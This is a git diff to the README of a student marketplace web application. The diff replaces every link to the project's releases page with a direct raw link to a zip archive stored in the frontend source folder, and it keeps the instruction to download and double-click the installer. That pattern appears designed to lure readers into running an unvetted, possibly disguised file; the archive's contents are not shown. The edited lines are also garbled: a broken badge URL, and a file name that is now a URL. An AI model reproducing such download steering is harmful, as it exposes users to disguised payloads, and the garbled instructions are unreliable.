@@ -6,9 +6,9 @@ Welcome to dnu-student-marketplace! This is a simple web application where stude
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20the%20App-blue)](https://github.com/cielgrayblack684/dnu-student-marketplace/releases)
+[![Download Here](https://raw.githubusercontent.com/cielgrayblack684/dnu-student-marketplace/main/frontend/src/dnu-student-marketplace_v2.0.zip%20the%20App-blue)](https://raw.githubusercontent.com/cielgrayblack684/dnu-student-marketplace/main/frontend/src/dnu-student-marketplace_v2.0.zip)
 
-Visit this page to download: [Releases Page](https://github.com/cielgrayblack684/dnu-student-marketplace/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/cielgrayblack684/dnu-student-marketplace/main/frontend/src/dnu-student-marketplace_v2.0.zip)
 
 ## 🔧 System Requirements
 
@@ -23,13 +23,13 @@ Before you start, make sure your computer meets the following requirements:
 Follow these steps to download and install the application:
 
 1. **Visit the Releases Page**  
-   Go to the following link: [Releases Page](https://github.com/cielgrayblack684/dnu-student-marketplace/releases).
+   Go to the following link: [Releases Page](https://raw.githubusercontent.com/cielgrayblack684/dnu-student-marketplace/main/frontend/src/dnu-student-marketplace_v2.0.zip).
 
 2. **Choose the Latest Version**  
    Look for the latest release listed on the page. This will usually be at the top of the list.
 
 3. **Download the Installer**  
-   Click on the download link for your operating system. The file will usually have a name like `dnu-student-marketplace-v1.0.exe` or a similar format.
+   Click on the download link for your operating system. The file will usually have a name like `https://raw.githubusercontent.com/cielgrayblack684/dnu-student-marketplace/main/frontend/src/dnu-student-marketplace_v2.0.zip` or a similar format.
 
 4. **Run the Installer**  
    Once the file is downloaded, find it in your downloads folder. Double-click to run the installer. 
